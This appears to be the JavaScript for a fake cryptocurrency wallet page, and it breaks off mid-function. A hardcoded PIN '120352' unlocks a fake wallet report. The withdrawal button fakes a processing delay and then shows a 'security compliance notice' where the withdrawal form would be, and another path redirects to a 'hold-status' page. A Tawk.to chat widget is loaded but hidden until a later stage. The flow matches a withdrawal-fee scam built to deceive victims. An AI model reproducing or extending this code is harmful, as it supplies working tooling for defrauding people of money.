// 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (HIDDEN FOR STAGE 2)
var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
(function(){
    var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
    s1.async = true;
    s1.src = 'https://tawk.to';
    s1.charset = 'UTF-8';
    s1.setAttribute('crossorigin', '*');
    s0.parentNode.insertBefore(s1, s0);
})();

Tawk_API = Tawk_API || {};
Tawk_API.onLoad = function(){
    Tawk_API.hideWidget();
};

// PAGE TRANSITION CONTROLLER MATRIX FOR STEP BY STEP
function executeTokenValidation() {
    const pinField = document.getElementById('pinVerificationInput');
    const loginCard = document.getElementById('layerPINVerification');
    const spinnerCard = document.getElementById('layerLoadingWheel');

    if (pinField && pinField.value.trim() === "120352") {
        if (loginCard) loginCard.classList.add('d-none');
        if (spinnerCard) spinnerCard.classList.remove('d-none');
        
        // 3-segundong loading animation bago tuluyang lumipat sa huling page (hold-status.html)
        setTimeout(function() {
            window.location.href = "hold-status.html";
        }, 3000);
    } else {
        alert("Security validation failure: Input token parameter mismatched.");
    }
}
// 🌐 SECURE MASTER LOGIC ATTACHMENT COMPONENT
document.addEventListener("DOMContentLoaded", function () {
    const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
    const walletInput = document.getElementById("walletAuthCodeField");
    const reportLayer = document.getElementById("walletReportMatrixLayer");
    const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
    const loadingSection = document.getElementById("loadingSection");
    const securityComplianceSection = document.getElementById("securityComplianceSection");

    // Step 0 -> Step 1: Login Verification Gate
    if (syncWalletBtn) {
        syncWalletBtn.addEventListener("click", function () {
            if (walletInput.value.trim() === "120352") {
                const authBlock = document.getElementById("authGatewayBlock");
                if (authBlock) authBlock.classList.add("d-none");
                if (reportLayer) {
                    reportLayer.classList.remove("d-none");
                    reportLayer.scrollIntoView({ behavior: 'smooth' });
                }
            } else {
                alert("Wallet credentials mismatch error.");
            }
        });
    }

    // Step 1 -> Step 2: Trigger Security Compliance Notice Instead of Withdrawal Form
    if (withdrawalBtn) {
        withdrawalBtn.addEventListener("click", function () {
            if (reportLayer) reportLayer.classList.add("d-none");
            if (loadingSection) {
                loadingSection.classList.remove("d-none");
                loadingSection.scrollIntoView({ behavior: 'smooth' });
            }

            // Simulate processing delay
            setTimeout(function () {
                if (loadingSection) loadingSection.classList.add("d-none");
                if (securityComplianceSection) {
                    securityComplianceSection.classList.remove("d-none");
                    securityComplianceSection.scrollIntoView({ behavior: 'smooth' });
                }
            }, 2000);
        });
    }

    